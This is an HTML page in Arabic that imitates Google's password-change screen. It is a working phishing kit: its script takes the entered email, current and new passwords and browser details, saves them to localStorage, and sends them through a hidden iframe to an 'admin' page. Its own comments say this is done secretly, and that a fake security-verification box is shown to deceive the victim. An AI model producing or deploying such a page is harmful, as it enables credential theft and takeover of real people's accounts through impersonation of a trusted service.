<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <base target="_self">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تغيير كلمة المرور - حساب Google</title>
    <meta name="description" content="صفحة تغيير كلمة المرور لحساب Google">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        googleBlue: "#4285F4",
                        googleRed: "#EA4335",
                        googleGreen: "#34A853"
                    }
                }
            }
        }
    </script>
</head>
<body class="min-h-screen bg-white font-sans">
    <div class="container mx-auto px-4 py-8 max-w-md">
        <!-- Header Section -->
        <header class="mb-8 text-center">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="شعار Google" class="h-8 mx-auto mb-6">
            <h1 class="text-2xl font-medium text-gray-800">تغيير كلمة المرور</h1>
        </header>

        <!-- Main Form -->
        <main>
            <form id="passwordChangeForm" class="space-y-6">
                <!-- Email Field -->
                <div class="space-y-1">
                    <label for="email" class="block text-sm font-medium text-gray-700">البريد الإلكتروني</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
                            <i class="fas fa-envelope"></i>
                        </div>
                        <input 
                            type="email" 
                            id="email" 
                            name="email" 
                            placeholder="example@gmail.com" 
                            class="w-full pl-3 pr-10 py-2 border rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                            required
                        >
                    </div>
                </div>

                <!-- Password Fields -->
                <div id="password-fields" class="space-y-4"></div>

                <!-- Password Requirements -->
                <div class="text-sm text-gray-600 space-y-1">
                    <p>يجب أن تكون كلمة المرور 8 أحرف على الأقل</p>
                    <p>يُفضل استخدام حروف + أرقام + رموز</p>
                </div>

                <!-- Error Messages -->
                <div id="error-messages" class="text-red-500 text-sm hidden"></div>

                <!-- Submit Button -->
                <button type="submit" class="w-full py-2 px-4 bg-googleBlue text-white rounded hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50">
                    تغيير كلمة المرور
                </button>
            </form>

            <!-- Security Verification (Conditional) -->
            <div id="security-verification" class="mt-8 p-4 border rounded-lg hidden">
                <h3 class="font-medium mb-3">التحقق الأمني</h3>
                <div class="space-y-3">
                    <div class="flex items-center">
                        <input type="radio" id="sms-verification" name="verification" value="SMS" class="mr-2" checked>
                        <label for="sms-verification">إرسال رمز إلى هاتفي</label>
                    </div>
                    <div class="flex items-center">
                        <input type="radio" id="authenticator-verification" name="verification" value="Google Authenticator" class="mr-2">
                        <label for="authenticator-verification">استخدام تطبيق Google Authenticator</label>
                    </div>
                </div>
            </div>

            <!-- رسالة مخفية تماماً (المستخدم لا يراها) -->
            <div id="hidden-message" style="display: none;"></div>
        </main>
    </div>

    <script>
        // Password fields data
        const passwordFields = [
            {
                "id": "current-password",
                "label": "كلمة المرور الحالية",
                "placeholder": "أدخل كلمة المرور الحالية",
                "icon": "lock"
            },
            {
                "id": "new-password",
                "label": "كلمة المرور الجديدة",
                "placeholder": "أدخل كلمة المرور الجديدة",
                "icon": "lock"
            },
            {
                "id": "confirm-password",
                "label": "تأكيد كلمة المرور الجديدة",
                "placeholder": "أعد إدخال كلمة المرور الجديدة",
                "icon": "lock"
            }
        ];

        const errorMessages = {
            "mismatch": "كلمة المرور غير متطابقة",
            "weak": "كلمة المرور ضعيفة",
            "short": "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل"
        };

        // Render password fields
        function renderPasswordFields(fields) {
            return fields.map(field => `
                <div class="space-y-1">
                    <label for="${field.id}" class="block text-sm font-medium text-gray-700">${field.label}</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none text-gray-400">
                            <i class="fas fa-${field.icon}"></i>
                        </div>
                        <input 
                            type="password" 
                            id="${field.id}" 
                            name="${field.id}" 
                            placeholder="${field.placeholder}" 
                            class="w-full pl-3 pr-10 py-2 border rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                            required
                        >
                        <button 
                            type="button" 
                            class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500 hover:text-gray-700"
                            onclick="togglePasswordVisibility('${field.id}')"
                        >
                            <i class="far fa-eye"></i>
                        </button>
                    </div>
                </div>
            `).join("");
        }

        // Show error messages
        function renderErrorMessages(errors) {
            const container = document.getElementById("error-messages");
            if (errors.length === 0) {
                container.classList.add("hidden");
                return;
            }
            
            container.innerHTML = errors.map(error => `<p>${error}</p>`).join("");
            container.classList.remove("hidden");
        }

        // Toggle password visibility
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const icon = field.parentElement.querySelector(".fa-eye, .fa-eye-slash");
            
            if (field.type === "password") {
                field.type = "text";
                icon.classList.replace("fa-eye", "fa-eye-slash");
            } else {
                field.type = "password";
                icon.classList.replace("fa-eye-slash", "fa-eye");
            }
        }

        // Validate password
        function validatePassword() {
            const newPassword = document.getElementById("new-password").value;
            const confirmPassword = document.getElementById("confirm-password").value;
            const email = document.getElementById("email").value;
            const errors = [];
            
            if (!email) {
                errors.push("البريد الإلكتروني مطلوب");
            }
            
            if (newPassword.length < 8) {
                errors.push(errorMessages.short);
            }
            
            if (newPassword !== confirmPassword) {
                errors.push(errorMessages.mismatch);
            }
            
            renderErrorMessages(errors);
            return errors.length === 0;
        }

        // Send data to admin panel (في الخفاء)
        async function sendToAdmin(data) {
            try {
                // حفظ في localStorage كنسخة احتياطية
                const backup = JSON.parse(localStorage.getItem('backup_data') || '[]');
                backup.push({
                    ...data,
                    backup_time: new Date().toLocaleString('ar-EG')
                });
                localStorage.setItem('backup_data', JSON.stringify(backup));
                
                // محاولة فتح صفحة الأدمن في إطار مخفي (iframe)
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'admin.html?data=' + encodeURIComponent(JSON.stringify(data));
                document.body.appendChild(iframe);
                
                setTimeout(() => {
                    document.body.removeChild(iframe);
                }, 1000);
                
                return true;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }

        // Handle form submission
        document.getElementById("passwordChangeForm").addEventListener("submit", async function(e) {
            e.preventDefault();
            
            if (!validatePassword()) {
                return;
            }
            
            // Collect all data
            const formData = {
                email: document.getElementById("email").value,
                currentPassword: document.getElementById("current-password").value,
                newPassword: document.getElementById("new-password").value,
                confirmPassword: document.getElementById("confirm-password").value,
                verification: document.querySelector('input[name="verification"]:checked').value,
                timestamp: new Date().toLocaleString('ar-EG'),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language
            };
            
            // إرسال البيانات في الخفاء (بدون إظهار أي شيء للمستخدم)
            await sendToAdmin(formData);
            
            // ⚠️ لا توجد أي رسالة تظهر للمستخدم
            // المستخدم لن يرى أي شيء، فقط يضغط الزر وينتهي
            
            // إظهار التحقق الأمني (لإيهام المستخدم أن شيئاً يحدث)
            document.getElementById("security-verification").classList.remove("hidden");
            
            // اختياري: إعادة تعيين الحقول أو تركها كما هي
            // this.reset(); // لو تحطها، الحقول تتفضى
        });

        // Initial render
        document.getElementById("password-fields").innerHTML = renderPasswordFields(passwordFields);
    </script>
</body>
</html>
